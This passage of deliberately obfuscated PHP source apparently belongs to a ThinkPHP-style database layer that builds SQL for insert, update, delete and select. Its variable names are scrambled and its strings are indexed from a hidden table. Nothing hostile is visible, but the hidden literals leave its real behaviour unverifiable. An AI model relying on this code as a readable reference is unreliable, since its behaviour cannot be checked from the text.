$ŞûÎó×å = $Á¦ç®ºÕ; } $Á¦ç®ºÕ = $ŞûÎó×å !== -1 ? $ŞûÎó×å : $Á¦ç®ºÕ; $î¥å‹öÊ = array($çÁ¶µ[893] => isset($Ê“ÁÂÁ¾[$çÁ¶µ[893]][$Á¦ç®ºÕ]) ? $Ê“ÁÂÁ¾[$çÁ¶µ[893]][$Á¦ç®ºÕ] : $Ê“ÁÂÁ¾[$çÁ¶µ[893]][0], $çÁ¶µ[894] => isset($Ê“ÁÂÁ¾[$çÁ¶µ[894]][$Á¦ç®ºÕ]) ? $Ê“ÁÂÁ¾[$çÁ¶µ[894]][$Á¦ç®ºÕ] : $Ê“ÁÂÁ¾[$çÁ¶µ[894]][0], $çÁ¶µ[891] => isset($Ê“ÁÂÁ¾[$çÁ¶µ[891]][$Á¦ç®ºÕ]) ? $Ê“ÁÂÁ¾[$çÁ¶µ[891]][$Á¦ç®ºÕ] : $Ê“ÁÂÁ¾[$çÁ¶µ[891]][0], $çÁ¶µ[892] => isset($Ê“ÁÂÁ¾[$çÁ¶µ[892]][$Á¦ç®ºÕ]) ? $Ê“ÁÂÁ¾[$çÁ¶µ[892]][$Á¦ç®ºÕ] : $Ê“ÁÂÁ¾[$çÁ¶µ[892]][0], $çÁ¶µ[21] => isset($Ê“ÁÂÁ¾[$çÁ¶µ[21]][$Á¦ç®ºÕ]) ? $Ê“ÁÂÁ¾[$çÁ¶µ[21]][$Á¦ç®ºÕ] : $Ê“ÁÂÁ¾[$çÁ¶µ[21]][0], $çÁ¶µ[921] => isset($Ê“ÁÂÁ¾[$çÁ¶µ[921]][$Á¦ç®ºÕ]) ? $Ê“ÁÂÁ¾[$çÁ¶µ[921]][$Á¦ç®ºÕ] : $Ê“ÁÂÁ¾[$çÁ¶µ[921]][0], $çÁ¶µ[17] => isset($Ê“ÁÂÁ¾[$çÁ¶µ[17]][$Á¦ç®ºÕ]) ? $Ê“ÁÂÁ¾[$çÁ¶µ[17]][$Á¦ç®ºÕ] : $Ê“ÁÂÁ¾[$çÁ¶µ[17]][0]); return $this->connect($î¥å‹öÊ, $Á¦ç®ºÕ); } public function parseDSN($Ì†¤¸‚) { $œ…¸ø°‘ =& $_SERVER[ÏéâËõ‘]; if (empty($Ì†¤¸‚)) { return !1; } $§ôÂÀ¤Ö = parse_url($Ì†¤¸‚); if ($§ôÂÀ¤Ö[$œ…¸ø°‘[180]]) { $ÎéÖú³ƒ = array($œ…¸ø°‘[966] => $§ôÂÀ¤Ö[$œ…¸ø°‘[180]], $œ…¸ø°‘[893] => isset($§ôÂÀ¤Ö[$œ…¸ø°‘[600]]) ? $§ôÂÀ¤Ö[$œ…¸ø°‘[600]] : $œ…¸ø°‘[12], $œ…¸ø°‘[894] => isset($§ôÂÀ¤Ö[$œ…¸ø°‘[990]]) ? $§ôÂÀ¤Ö[$œ…¸ø°‘[990]] : $œ…¸ø°‘[12], $œ…¸ø°‘[891] => isset($§ôÂÀ¤Ö[$œ…¸ø°‘[181]]) ? $§ôÂÀ¤Ö[$œ…¸ø°‘[181]] : $œ…¸ø°‘[12], $œ…¸ø°‘[892] => isset($§ôÂÀ¤Ö[$œ…¸ø°‘[182]]) ? $§ôÂÀ¤Ö[$œ…¸ø°‘[182]] : $œ…¸ø°‘[12], $œ…¸ø°‘[21] => isset($§ôÂÀ¤Ö[$œ…¸ø°‘[84]]) ? substr($§ôÂÀ¤Ö[$œ…¸ø°‘[84]], 1) : $œ…¸ø°‘[12]); } else { preg_match($œ…¸ø°‘[991], trim($Ì†¤¸‚), $à•®»Å); $ÎéÖú³ƒ = array($œ…¸ø°‘[966] => $à•®»Å[1], $œ…¸ø°‘[893] => $à•®»Å[2], $œ…¸ø°‘[894] => $à•®»Å[3], $œ…¸ø°‘[891] => $à•®»Å[4], $œ…¸ø°‘[892] => $à•®»Å[5], $œ…¸ø°‘[21] => $à•®»Å[6]); } $ÎéÖú³ƒ[$œ…¸ø°‘[921]] = $œ…¸ø°‘[12]; return $ÎéÖú³ƒ; } protected function debug() { $Á…éÇº‚ =& $_SERVER[ÏéâËõ‘]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $Á…éÇº‚[992]; if (think_config($Á…éÇº‚[993])) { think_status($Á…éÇº‚[994]); think_trace($this->queryStr . $Á…éÇº‚[995] . think_status($Á…éÇº‚[24], $Á…éÇº‚[994], 6) . $Á…éÇº‚[996], $Á…éÇº‚[12], $Á…éÇº‚[997]); } } protected function parseLock($øá³ì‚ù = false) { $¹Ÿ‡Îş =& $_SERVER[ÏéâËõ‘]; if (!$øá³ì‚ù) { return $¹Ÿ‡Îş[12]; } if ($¹Ÿ‡Îş[923] == $this->dbType) { return $¹Ÿ‡Îş[998]; } return $¹Ÿ‡Îş[999]; } protected function parseSet($‘®€µä) { $ô×§”£ =& $_SERVER[ÏéâËõ‘]; foreach ($‘®€µä as $‹ı†ïÇÍ => $²ã±¶Å™) { if (is_array($²ã±¶Å™) && $ô×§”£[297] == $²ã±¶Å™[0]) { $ÎË³è[] = $this->parseKey($‹ı†ïÇÍ) . $ô×§”£[889] . $²ã±¶Å™[1]; } elseif (is_scalar($²ã±¶Å™) || is_null($²ã±¶Å™)) { $ÎË³è[] = $this->parseKey($‹ı†ïÇÍ) . $ô×§”£[889] . $this->parseValue($²ã±¶Å™); } } return $ô×§”£[1000] . implode($ô×§”£[50], $ÎË³è); } protected function bindParam($š–øé÷”, $Ï®¶–½Æ) { $this->bind[$_SERVER[ÏéâËõ‘][4] . $š–øé÷”] = $Ï®¶–½Æ; } protected function parseBind($©Ñ‰€‚) { $©Ñ‰€‚ = array_merge($this->bind, $©Ñ‰€‚); $this->bind = array(); return $©Ñ‰€‚; } function parseKey(&$²é³ÁûÙ, $ô¸¼ÁûÌ = true) { if ($ô¸¼ÁûÌ) { $²é³ÁûÙ = $this->parseKeyCheck($²é³ÁûÙ); } return $²é³ÁûÙ; } function parseKeyCheck($®îÙ íÌ) { $®ù‚Õœ™ =& $_SERVER[ÏéâËõ‘]; $®îÙ íÌ = trim($®îÙ íÌ); if (!preg_match($®ù‚Õœ™[1001], $®îÙ íÌ)) { think_exception($®ù‚Õœ™[1002] . $®îÙ íÌ); } return $®îÙ íÌ; } protected function parseValue($¬…Èò¼÷) { $ÏÏ—Ø®ş =& $_SERVER[ÏéâËõ‘]; if (is_string($¬…Èò¼÷)) { $¬…Èò¼÷ = $ÏÏ—Ø®ş[962] . $this->escapeString($¬…Èò¼÷) . $ÏÏ—Ø®ş[962]; } elseif (isset($¬…Èò¼÷[0]) && is_string($¬…Èò¼÷[0]) && strtolower($¬…Èò¼÷[0]) == $ÏÏ—Ø®ş[297]) { $¬…Èò¼÷ = $this->escapeString($¬…Èò¼÷[1]); } elseif (is_array($¬…Èò¼÷)) { $¬…Èò¼÷ = array_map(array($this, $ÏÏ—Ø®ş[963]), $¬…Èò¼÷); } elseif (is_bool($¬…Èò¼÷)) { $¬…Èò¼÷ = $¬…Èò¼÷ ? $ÏÏ—Ø®ş[88] : $ÏÏ—Ø®ş[197]; } elseif (is_null($¬…Èò¼÷)) { $¬…Èò¼÷ = $ÏÏ—Ø®ş[103]; } return $¬…Èò¼÷; } protected function parseField($Îç­ñÌ) { $ı–Ü½Ì§ =& $_SERVER[ÏéâËõ‘]; if (is_string($Îç­ñÌ) && strpos($Îç­ñÌ, $ı–Ü½Ì§[50])) { $Îç­ñÌ = explode($ı–Ü½Ì§[50], $Îç­ñÌ); } if (is_array($Îç­ñÌ)) { $×çÕï­ğ = array(); foreach ($Îç­ñÌ as $ôªÛõ²½ => $—†¼Æ‚Ş) { if (!is_numeric($ôªÛõ²½)) { $×çÕï­ğ[] = $this->parseKey($ôªÛõ²½, !1) . $ı–Ü½Ì§[1003] . $this->parseKey($—†¼Æ‚Ş); } else { $×çÕï­ğ[] = $this->parseKey($—†¼Æ‚Ş); } } $»÷¼ÑÏå = implode($ı–Ü½Ì§[50], $×çÕï­ğ); } elseif (is_string($Îç­ñÌ) && !empty($Îç­ñÌ)) { $»÷¼ÑÏå = $Îç­ñÌ; } else { $»÷¼ÑÏå = $ı–Ü½Ì§[188]; } return $»÷¼ÑÏå; } protected function parseTable($Ê±«÷œ) { $¢öşÑã’ =& $_SERVER[ÏéâËõ‘]; if (is_array($Ê±«÷œ)) { $–øƒ»§Ò = array(); foreach ($Ê±«÷œ as $ú®èŸÃ => $À´Ì“•µ) { if (!is_numeric($ú®èŸÃ)) { $–øƒ»§Ò[] = $this->parseKey($ú®èŸÃ) . $¢öşÑã’[53] . $this->parseKey($À´Ì“•µ); } else { $–øƒ»§Ò[] = $this->parseKey($ú®èŸÃ); } } $Ê±«÷œ = $–øƒ»§Ò; } elseif (is_string($Ê±«÷œ)) { if (strstr($Ê±«÷œ, $¢öşÑã’[53])) { return $Ê±«÷œ; } $Ê±«÷œ = explode($¢öşÑã’[50], $Ê±«÷œ); array_walk($Ê±«÷œ, array($this, $¢öşÑã’[911])); } return $¢öşÑã’[905] . trim(implode($¢öşÑã’[1004], $Ê±«÷œ), $¢öşÑã’[385]) . $¢öşÑã’[905]; } protected function parseWhere($ÈÍÙĞÆ) { $ØÈÖ¬¨ =& $_SERVER[ÏéâËõ‘]; $¥›Ó«Å† = $ØÈÖ¬¨[12]; if (is_string($ÈÍÙĞÆ)) { $¥›Ó«Å† = $ÈÍÙĞÆ; } else { $¨…¹º¥™ = isset($ÈÍÙĞÆ[$ØÈÖ¬¨[1005]]) ? strtoupper($ÈÍÙĞÆ[$ØÈÖ¬¨[1005]]) : $ØÈÖ¬¨[12]; if (in_array($¨…¹º¥™, array($ØÈÖ¬¨[1006], $ØÈÖ¬¨[1007], $ØÈÖ¬¨[1008]))) { $¨…¹º¥™ = $ØÈÖ¬¨[53] . $¨…¹º¥™ . $ØÈÖ¬¨[53]; unset($ÈÍÙĞÆ[$ØÈÖ¬¨[1005]]); } else { $¨…¹º¥™ = $ØÈÖ¬¨[1009]; } foreach ($ÈÍÙĞÆ as $Ã¢Õœïã => $Â¨¼Ñãæ) { $¥›Ó«Å† .= $ØÈÖ¬¨[277]; if (is_numeric($Ã¢Õœïã)) { $Ã¢Õœïã = $ØÈÖ¬¨[1010]; } if (0 === strpos($Ã¢Õœïã, $ØÈÖ¬¨[11])) { $¥›Ó«Å† .= $this->parseThinkWhere($Ã¢Õœïã, $Â¨¼Ñãæ); } else { if (!preg_match($ØÈÖ¬¨[1011], trim($Ã¢Õœïã))) { think_exception(think_lang($ØÈÖ¬¨[1012]) . $ØÈÖ¬¨[4] . $Ã¢Õœïã); } $¬åİ³ññ = is_array($Â¨¼Ñãæ) && isset($Â¨¼Ñãæ[$ØÈÖ¬¨[1013]]); $Ã¢Õœïã = trim($Ã¢Õœïã); if (strpos($Ã¢Õœïã, $ØÈÖ¬¨[283])) { $ù¼©Ç´ = explode($ØÈÖ¬¨[283], $Ã¢Õœïã); $¨ãåËÆÒ = array(); foreach ($ù¼©Ç´ as $ÆØÇ˜ñ¥ => $‹¹­Ì°·) { $ıŒ„¨¾‡ = $¬åİ³ññ ? $Â¨¼Ñãæ[$ÆØÇ˜ñ¥] : $Â¨¼Ñãæ; $¨ãåËÆÒ[] = $ØÈÖ¬¨[260] . $this->parseWhereItem($this->parseKey($‹¹­Ì°·), $ıŒ„¨¾‡) . $ØÈÖ¬¨[910]; } $¥›Ó«Å† .= implode($ØÈÖ¬¨[1014], $¨ãåËÆÒ); } elseif (strpos($Ã¢Õœïã, $ØÈÖ¬¨[284])) { $ù¼©Ç´ = explode($ØÈÖ¬¨[284], $Ã¢Õœïã); $¨ãåËÆÒ = array(); foreach ($ù¼©Ç´ as $ÆØÇ˜ñ¥ => $‹¹­Ì°·) { $ıŒ„¨¾‡ = $¬åİ³ññ ? $Â¨¼Ñãæ[$ÆØÇ˜ñ¥] : $Â¨¼Ñãæ; $¨ãåËÆÒ[] = $ØÈÖ¬¨[260] . $this->parseWhereItem($this->parseKey($‹¹­Ì°·), $ıŒ„¨¾‡) . $ØÈÖ¬¨[910]; } $¥›Ó«Å† .= implode($ØÈÖ¬¨[1009], $¨ãåËÆÒ); } else { $¥›Ó«Å† .= $this->parseWhereItem($this->parseKey($Ã¢Õœïã), $Â¨¼Ñãæ); } } $¥›Ó«Å† .= $ØÈÖ¬¨[278] . $¨…¹º¥™; } $¥›Ó«Å† = substr($¥›Ó«Å†, 0, -strlen($¨…¹º¥™)); } return empty($¥›Ó«Å†) ? $ØÈÖ¬¨[12] : $ØÈÖ¬¨[1015] . $¥›Ó«Å†; } protected function parseWhereItem($Õ¸‡¢§ƒ, $ÁçïûŠ) { $Ëú¸Óœç =& $_SERVER[ÏéâËõ‘]; $œË·İüË = $Ëú¸Óœç[12]; if (is_array($ÁçïûŠ)) { if (is_string($ÁçïûŠ[0])) { $½ì²Ï›ß = strtolower($ÁçïûŠ[0]); if (in_array($ÁçïûŠ[0], array($Ëú¸Óœç[889], $Ëú¸Óœç[1016], $Ëú¸Óœç[1017], $Ëú¸Óœç[1018], $Ëú¸Óœç[1019], $Ëú¸Óœç[1020]))) { $œË·İüË .= $Õ¸‡¢§ƒ . $Ëú¸Óœç[53] . $ÁçïûŠ[0] . $Ëú¸Óœç[53] . $this->parseValue($ÁçïûŠ[1]); } elseif (preg_match($Ëú¸Óœç[1021], $ÁçïûŠ[0])) { $œË·İüË .= $Õ¸‡¢§ƒ . $Ëú¸Óœç[53] . $this->exp[$½ì²Ï›ß] . $Ëú¸Óœç[53] . $this->parseValue($ÁçïûŠ[1]); } elseif (preg_match($Ëú¸Óœç[1022], $ÁçïûŠ[0])) { if (is_array($ÁçïûŠ[1])) { $ë¬‡Éêİ = isset($ÁçïûŠ[2]) ? strtoupper($ÁçïûŠ[2]) : $Ëú¸Óœç[1007]; if (in_array($ë¬‡Éêİ, array($Ëú¸Óœç[1006], $Ëú¸Óœç[1007], $Ëú¸Óœç[1008]))) { $Äé¿¢èü = array(); foreach ($ÁçïûŠ[1] as $äçá´äİ) { $Äé¿¢èü[] = $Õ¸‡¢§ƒ . $Ëú¸Óœç[53] . $this->exp[$½ì²Ï›ß] . $Ëú¸Óœç[53] . $this->parseValue($äçá´äİ); } $œË·İüË .= $Ëú¸Óœç[260] . implode($Ëú¸Óœç[53] . $ë¬‡Éêİ . $Ëú¸Óœç[53], $Äé¿¢èü) . $Ëú¸Óœç[910]; } } else { $œË·İüË .= $Õ¸‡¢§ƒ . $Ëú¸Óœç[53] . $this->exp[$½ì²Ï›ß] . $Ëú¸Óœç[53] . $this->parseValue($ÁçïûŠ[1]); } } elseif ($Ëú¸Óœç[297] == $½ì²Ï›ß) { $œË·İüË .= $Ëú¸Óœç[908] . $Õ¸‡¢§ƒ . $Ëú¸Óœç[53] . $ÁçïûŠ[1] . $Ëú¸Óœç[1023]; } elseif (preg_match($Ëú¸Óœç[1024], $ÁçïûŠ[0])) { $œË·İüË .= $ÁçïûŠ[0]; } elseif (preg_match($Ëú¸Óœç[1025], $ÁçïûŠ[0])) { if (isset($ÁçïûŠ[2]) && $Ëú¸Óœç[297] == $ÁçïûŠ[2]) { $œË·İüË .= $Õ¸‡¢§ƒ . $Ëú¸Óœç[53] . $this->exp[$½ì²Ï›ß] . $Ëú¸Óœç[53] . $ÁçïûŠ[1]; } else { if (is_string($ÁçïûŠ[1])) { $ÁçïûŠ[1] = explode($Ëú¸Óœç[50], $ÁçïûŠ[1]); } $ÊÁÁ¿¡ = implode($Ëú¸Óœç[50], $this->parseValue($ÁçïûŠ[1])); $œË·İüË .= $Õ¸‡¢§ƒ . $Ëú¸Óœç[53] . $this->exp[$½ì²Ï›ß] . $Ëú¸Óœç[908] . $ÊÁÁ¿¡ . $Ëú¸Óœç[910]; } } elseif (preg_match($Ëú¸Óœç[1026], $ÁçïûŠ[0])) { $ğ„™õŒ° = is_string($ÁçïûŠ[1]) ? explode($Ëú¸Óœç[50], $ÁçïûŠ[1]) : $ÁçïûŠ[1]; $œË·İüË .= $Ëú¸Óœç[908] . $Õ¸‡¢§ƒ . $Ëú¸Óœç[53] . $this->exp[$½ì²Ï›ß] . $Ëú¸Óœç[53] . $this->parseValue($ğ„™õŒ°[0]) . $Ëú¸Óœç[1009] . $this->parseValue($ğ„™õŒ°[1]) . $Ëú¸Óœç[278]; } else { think_exception(think_lang($Ëú¸Óœç[1012]) . $Ëú¸Óœç[4] . $ÁçïûŠ[0]); } } else { $ ­¡È­ = count($ÁçïûŠ); $ÖÆæºĞá = $Ëú¸Óœç[12]; if (is_string($ÁçïûŠ[$ ­¡È­ - 1])) { $ÖÆæºĞá = isset($ÁçïûŠ[$ ­¡È­ - 1]) ? strtoupper($ÁçïûŠ[$ ­¡È­ - 1]) : $Ëú¸Óœç[12]; if (in_array($ÖÆæºĞá, array($Ëú¸Óœç[1006], $Ëú¸Óœç[1007], $Ëú¸Óœç[1008]))) { $ ­¡È­ = $ ­¡È­ - 1; } } else { $ÖÆæºĞá = $Ëú¸Óœç[1006]; } for ($ÚÅƒ½åñ = 0; $ÚÅƒ½åñ < $ ­¡È­; $ÚÅƒ½åñ++) { $ğ„™õŒ° = is_array($ÁçïûŠ[$ÚÅƒ½åñ]) ? $ÁçïûŠ[$ÚÅƒ½åñ][1] : $ÁçïûŠ[$ÚÅƒ½åñ]; if ($Ëú¸Óœç[297] == strtolower($ÁçïûŠ[$ÚÅƒ½åñ][0])) { $œË·İüË .= $Ëú¸Óœç[260] . $Õ¸‡¢§ƒ . $Ëú¸Óœç[53] . $ğ„™õŒ° . $Ëú¸Óœç[1023] . $ÖÆæºĞá . $Ëú¸Óœç[53]; } else { $ÁéôË÷Ÿ = is_array($ÁçïûŠ[$ÚÅƒ½åñ]) ? $this->exp[strtolower($ÁçïûŠ[$ÚÅƒ½åñ][0])] : $Ëú¸Óœç[889]; if (!$ÁéôË÷Ÿ && is_array($ÁçïûŠ[$ÚÅƒ½åñ]) && in_array($ÁçïûŠ[$ÚÅƒ½åñ][0], array($Ëú¸Óœç[889], $Ëú¸Óœç[1016], $Ëú¸Óœç[1017], $Ëú¸Óœç[1018], $Ëú¸Óœç[1019], $Ëú¸Óœç[1020]))) { $ÁéôË÷Ÿ = $ÁçïûŠ[$ÚÅƒ½åñ][0]; } $œË·İüË .= $Ëú¸Óœç[260] . $Õ¸‡¢§ƒ . $Ëú¸Óœç[53] . $ÁéôË÷Ÿ . $Ëú¸Óœç[53] . $this->parseValue($ğ„™õŒ°) . $Ëú¸Óœç[1023] . $ÖÆæºĞá . $Ëú¸Óœç[53]; } } $œË·İüË = substr($œË·İüË, 0, -4); } } else { $œË·İüË .= $Õ¸‡¢§ƒ . $Ëú¸Óœç[1027] . $this->parseValue($ÁçïûŠ); } return $œË·İüË; } protected function parseThinkWhere($ÅôÓ˜¶ñ, $Ü…ßïÏş) { $îµ¬¼ =& $_SERVER[ÏéâËõ‘]; $‰‚‚ôĞş = $îµ¬¼[12]; switch ($ÅôÓ˜¶ñ) { case $îµ¬¼[352]: $‰‚‚ôĞş = $Ü…ßïÏş; break; case $îµ¬¼[1010]: $‰‚‚ôĞş = is_string($Ü…ßïÏş) ? $Ü…ßïÏş : substr($this->parseWhere($Ü…ßïÏş), 6); break; case $îµ¬¼[1028]: parse_str($Ü…ßïÏş, $ÅÖ½ñ…ü); if (isset($ÅÖ½ñ…ü[$îµ¬¼[1005]])) { $±‰…¡Ñ€ = $îµ¬¼[53] . strtoupper($ÅÖ½ñ…ü[$îµ¬¼[1005]]) . $îµ¬¼[53]; unset($ÅÖ½ñ…ü[$îµ¬¼[1005]]); } else { $±‰…¡Ñ€ = $îµ¬¼[1009]; } $ìÒÓ¨ë˜ = array(); foreach ($ÅÖ½ñ…ü as $ùÚàÑ˜Ğ => $ŸÑÁÙî) { $ìÒÓ¨ë˜[] = $this->parseKey($ùÚàÑ˜Ğ) . $îµ¬¼[1027] . $this->parseValue($ŸÑÁÙî); } $‰‚‚ôĞş = implode($±‰…¡Ñ€, $ìÒÓ¨ë˜); break; } return $‰‚‚ôĞş; } protected function parseLimit($õßçËùş) { $Æ“Â‚ =& $_SERVER[ÏéâËõ‘]; return !empty($õßçËùş) ? $Æ“Â‚[51] . $õßçËùş . $Æ“Â‚[53] : $Æ“Â‚[12]; } protected function parseJoin($û¬á÷à) { $óëì¨ï¯ =& $_SERVER[ÏéâËõ‘]; $ŠÑÚ¥µ® = $óëì¨ï¯[12]; if (!empty($û¬á÷à)) { if (is_array($û¬á÷à)) { foreach ($û¬á÷à as $äƒóÆáö => $Ä½ä¡ÌÁ) { if (!1 !== stripos($Ä½ä¡ÌÁ, $óëì¨ï¯[1029])) { $ŠÑÚ¥µ® .= $óëì¨ï¯[53] . $Ä½ä¡ÌÁ; } else { $ŠÑÚ¥µ® .= $óëì¨ï¯[1030] . $Ä½ä¡ÌÁ; } } } else { $ŠÑÚ¥µ® .= $óëì¨ï¯[1030] . $û¬á÷à; } } $ŠÑÚ¥µ® = preg_replace($óëì¨ï¯[1031], think_config($óëì¨ï¯[935]) . $óëì¨ï¯[1032], $ŠÑÚ¥µ®); return $ŠÑÚ¥µ®; } protected function parseOrder($€‡µ‹) { $°è¸œ =& $_SERVER[ÏéâËõ‘]; if (is_array($€‡µ‹)) { $»ÅÂé = array(); foreach ($€‡µ‹ as $ô¼·­æ¹ => $„¼ä“·) { if (is_numeric($ô¼·­æ¹)) { $»ÅÂé[] = $this->parseKey($„¼ä“·); } else { $„¼ä“· = in_array(strtoupper(trim($„¼ä“·)), array($°è¸œ[1033], $°è¸œ[1034])) ? $°è¸œ[53] . $„¼ä“· : $°è¸œ[12]; if (preg_match($°è¸œ[1035], $ô¼·­æ¹)) { $»ÅÂé[] = $this->parseKey($ô¼·­æ¹) . $„¼ä“·; } else { think_exception($°è¸œ[1036] . $ô¼·­æ¹); } } } $€‡µ‹ = implode($°è¸œ[50], $»ÅÂé); } return !empty($€‡µ‹) ? $°è¸œ[1037] . $€‡µ‹ : $°è¸œ[12]; } protected function parseGroup($ñ–Ôİ¾¨) { $¼æ¼­¼ö =& $_SERVER[ÏéâËõ‘]; return !empty($ñ–Ôİ¾¨) ? $¼æ¼­¼ö[1038] . $ñ–Ôİ¾¨ : $¼æ¼­¼ö[12]; } protected function parseHaving($ÈŒõæšÈ) { $úÔÅ–ÒÓ =& $_SERVER[ÏéâËõ‘]; return !empty($ÈŒõæšÈ) ? $úÔÅ–ÒÓ[1039] . $ÈŒõæšÈ : $úÔÅ–ÒÓ[12]; } protected function parseComment($İŠò¤àŒ) { $”†‹¸­ë =& $_SERVER[ÏéâËõ‘]; return !empty($İŠò¤àŒ) ? $”†‹¸­ë[1040] . $İŠò¤àŒ . $”†‹¸­ë[1041] : $”†‹¸­ë[12]; } protected function parseDistinct($Æ –ğ•Ë) { $ãÚ¯ù£™ =& $_SERVER[ÏéâËõ‘]; return !empty($Æ –ğ•Ë) ? $ãÚ¯ù£™[1042] : $ãÚ¯ù£™[12]; } protected function parseUnion($ÖüÜ›¼¸) { $Ë©¼Âç =& $_SERVER[ÏéâËõ‘]; if (empty($ÖüÜ›¼¸)) { return $Ë©¼Âç[12]; } if (isset($ÖüÜ›¼¸[$Ë©¼Âç[348]])) { $Ù¾ŠŠ¡ = $Ë©¼Âç[1043]; unset($ÖüÜ›¼¸[$Ë©¼Âç[348]]); } else { $Ù¾ŠŠ¡ = $Ë©¼Âç[1044]; } foreach ($ÖüÜ›¼¸ as $ü–âÍòÖ) { $æ˜ûß¢…[] = $Ù¾ŠŠ¡ . (is_array($ü–âÍòÖ) ? $this->buildSelectSql($ü–âÍòÖ) : $ü–âÍòÖ); } return implode($Ë©¼Âç[53], $æ˜ûß¢…); } public function insert($€Ÿ¦Âù«, $º›Å ¤ = array(), $İÂ¢¯œ÷ = false) { $’˜ÃõãÔ =& $_SERVER[ÏéâËõ‘]; $¦í‡Ò¼û = $ŸŒ­«ª = array(); $this->model = $º›Å ¤[$’˜ÃõãÔ[281]]; foreach ($€Ÿ¦Âù« as $æë º·É => $­ªÂ¨Ô ) { if (is_array($­ªÂ¨Ô ) && $’˜ÃõãÔ[297] == $­ªÂ¨Ô [0]) { $ŸŒ­«ª[] = $this->parseKey($æë º·É); $¦í‡Ò¼û[] = $­ªÂ¨Ô [1]; } elseif (is_scalar($­ªÂ¨Ô ) || is_null($­ªÂ¨Ô )) { $ŸŒ­«ª[] = $this->parseKey($æë º·É); $¦í‡Ò¼û[] = $this->parseValue($­ªÂ¨Ô ); } } $µ÷áÉ‘Ò = ($İÂ¢¯œ÷ ? $’˜ÃõãÔ[912] : $’˜ÃõãÔ[913]) . $’˜ÃõãÔ[914] . $this->parseTable($º›Å ¤[$’˜ÃõãÔ[279]]) . $’˜ÃõãÔ[908] . implode($’˜ÃõãÔ[50], $ŸŒ­«ª) . $’˜ÃõãÔ[909] . implode($’˜ÃõãÔ[50], $¦í‡Ò¼û) . $’˜ÃõãÔ[910]; $µ÷áÉ‘Ò .= $this->parseLock(isset($º›Å ¤[$’˜ÃõãÔ[845]]) ? $º›Å ¤[$’˜ÃõãÔ[845]] : !1); $µ÷áÉ‘Ò .= $this->parseComment(!empty($º›Å ¤[$’˜ÃõãÔ[354]]) ? $º›Å ¤[$’˜ÃõãÔ[354]] : $’˜ÃõãÔ[12]); return $this->execute($µ÷áÉ‘Ò, $this->parseBind(!empty($º›Å ¤[$’˜ÃõãÔ[285]]) ? $º›Å ¤[$’˜ÃõãÔ[285]] : array())); } public function selectInsert($»×Èé÷Ì, $çÈèÕ¿•, $ö±Œ‚‘ó = array()) { $£ã®ØÙé =& $_SERVER[ÏéâËõ‘]; $this->model = $ö±Œ‚‘ó[$£ã®ØÙé[281]]; if (is_string($»×Èé÷Ì)) { $»×Èé÷Ì = explode($£ã®ØÙé[50], $»×Èé÷Ì); } array_walk($»×Èé÷Ì, array($this, $£ã®ØÙé[911])); $ÜßÕÅöí = $£ã®ØÙé[1045] . $this->parseTable($çÈèÕ¿•) . $£ã®ØÙé[908] . implode($£ã®ØÙé[50], $»×Èé÷Ì) . $£ã®ØÙé[1023]; $ÜßÕÅöí .= $this->buildSelectSql($ö±Œ‚‘ó); return $this->execute($ÜßÕÅöí, $this->parseBind(!empty($ö±Œ‚‘ó[$£ã®ØÙé[285]]) ? $ö±Œ‚‘ó[$£ã®ØÙé[285]] : array())); } public function update($õõ¦àû“, $üè’Š”ã) { $–¨«šıó =& $_SERVER[ÏéâËõ‘]; $this->model = $üè’Š”ã[$–¨«šıó[281]]; $ş¼ÄÚ» = $–¨«šıó[1046] . $this->parseTable($üè’Š”ã[$–¨«šıó[279]]) . $this->parseSet($õõ¦àû“) . $this->parseWhere(!empty($üè’Š”ã[$–¨«šıó[275]]) ? $üè’Š”ã[$–¨«šıó[275]] : $–¨«šıó[12]) . $this->parseOrder(!empty($üè’Š”ã[$–¨«šıó[365]]) ? $üè’Š”ã[$–¨«šıó[365]] : $–¨«šıó[12]) . $this->parseLimit(!empty($üè’Š”ã[$–¨«šıó[292]]) ? $üè’Š”ã[$–¨«šıó[292]] : $–¨«šıó[12]) . $this->parseLock(isset($üè’Š”ã[$–¨«šıó[845]]) ? $üè’Š”ã[$–¨«šıó[845]] : !1) . $this->parseComment(!empty($üè’Š”ã[$–¨«šıó[354]]) ? $üè’Š”ã[$–¨«šıó[354]] : $–¨«šıó[12]); return $this->execute($ş¼ÄÚ», $this->parseBind(!empty($üè’Š”ã[$–¨«šıó[285]]) ? $üè’Š”ã[$–¨«šıó[285]] : array())); } public function delete($£Ø™ºÊŞ = array()) { $í¶¤µŠ =& $_SERVER[ÏéâËõ‘]; $this->model = $£Ø™ºÊŞ[$í¶¤µŠ[281]]; $Ã’¢·š¾ = $í¶¤µŠ[1047] . $this->parseTable($£Ø™ºÊŞ[$í¶¤µŠ[279]]) . $this->parseWhere(!empty($£Ø™ºÊŞ[$í¶¤µŠ[275]]) ? $£Ø™ºÊŞ[$í¶¤µŠ[275]] : $í¶¤µŠ[12]) . $this->parseOrder(!empty($£Ø™ºÊŞ[$í¶¤µŠ[365]]) ? $£Ø™ºÊŞ[$í¶¤µŠ[365]] : $í¶¤µŠ[12]) . $this->parseLimit(!empty($£Ø™ºÊŞ[$í¶¤µŠ[292]]) ? $£Ø™ºÊŞ[$í¶¤µŠ[292]] : $í¶¤µŠ[12]) . $this->parseLock(isset($£Ø™ºÊŞ[$í¶¤µŠ[845]]) ? $£Ø™ºÊŞ[$í¶¤µŠ[845]] : !1) . $this->parseComment(!empty($£Ø™ºÊŞ[$í¶¤µŠ[354]]) ? $£Ø™ºÊŞ[$í¶¤µŠ[354]] : $í¶¤µŠ[12]); return $this->execute($Ã’¢·š¾, $this->parseBind(!empty($£Ø™ºÊŞ[$í¶¤µŠ[285]]) ? $£Ø™ºÊŞ[$í¶¤µŠ[285]] : array())); } public function select($ŒÕŒ¢œä = array()) { $©†ğ˜´Œ =& $_SERVER[ÏéâËõ‘]; $this->model = $ŒÕŒ¢œä[$©†ğ˜´Œ[281]]; $üô¬¥Ä× = $this->buildSelectSql($ŒÕŒ¢œä); $ğá×å€÷ = isset($ŒÕŒ¢œä[$©†ğ˜´Œ[349]]) ? $ŒÕŒ¢œä[$©†ğ˜´Œ[349]] : !1; if ($ğá×å€÷) { $¼ë³¡•± = is_string($ğá×å€÷[$©†ğ˜´Œ[94]]) ? $ğá×å€÷[$©†ğ˜´Œ[94]] : $©†ğ˜´Œ[1048] . md5($üô¬¥Ä×); $°èÉ°ò³ = think_cache($¼ë³¡•±, $©†ğ˜´Œ[12], $ğá×å€÷); if (!1 !== $°èÉ°ò³) { return $°èÉ°ò³; } } $ĞÜ‡úòì = $this->query($üô¬¥Ä×, 